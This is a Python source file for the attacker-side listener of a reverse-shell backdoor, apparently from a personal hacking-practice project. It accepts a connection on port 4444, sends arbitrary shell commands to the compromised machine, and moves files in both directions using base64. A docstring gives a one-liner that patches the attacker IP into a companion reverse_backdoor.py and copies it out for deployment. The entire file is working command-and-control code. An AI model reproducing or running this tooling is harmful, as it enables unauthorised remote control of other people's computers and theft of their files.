#!/root/anaconda3/bin  python
import subprocess
import socket
import json
import base64



"""
1) Get your ip dynamically for interface eth0
2) Write the found ip in code of reverse_backdoor.py 
3) Copy file to remote machine shared folder 
4) Run the test ... 

my_ip=$(ip route | sed -n '/eth0/ p' | sed -n '/default/! p' | awk '{print $9}') && sed -i "s/Backdoor('[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+/Backdoor('$my_ip/ g" /root/Documents/Python/Hacking/Hack_tools/backdoor/reverse_backdoor.py  &&  cp /root/Documents/Python/Hacking/Hack_tools/backdoor/reverse_backdoor.py /root/Documents/Shared_vbox/  && python /root/Documents/Python/Hacking/Hack_tools/backdoor/listener.py

"""


class Listener(object):
    def __init__(self, interface, port):
        self.interface = interface
        self.my_ip = self.get_my_ip()
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.my_ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, self.address = listener.accept()
        print(f"[+] Got a connection from {str(self.address)}")

    def get_my_ip(self):
        return str(subprocess.check_output(
            r"ip route  |  sed -n '/" + self.interface + ".*kernel/ p' | awk '{print $9; exit}'", shell=True)).replace("b'", '').replace(r"\n'", '')

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def reliable_receive(self, json_data=''):
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except TypeError:
            for ind, el in enumerate(data):
                if isinstance(data[ind], bytes):
                    data[ind] = data[ind].decode()
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())

    def write_file(self, path, content):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content.encode()))
            return '[+] Download successful.'

    def read_file(self, path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read())

    def run(self):
        while True:
            command = input('>>')
            command = command.split(' ')
            try:
                if command[0] == 'download':
                    print(self.write_file(command[1],
                                          self.execute_remotely(command)))
                    continue
                elif command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                print(self.execute_remotely(command))
            except Exception:
                print("[-] Error during comand execution")


if __name__ == '__main__':
    listener = Listener('eth0', 4444)
    listener.run()
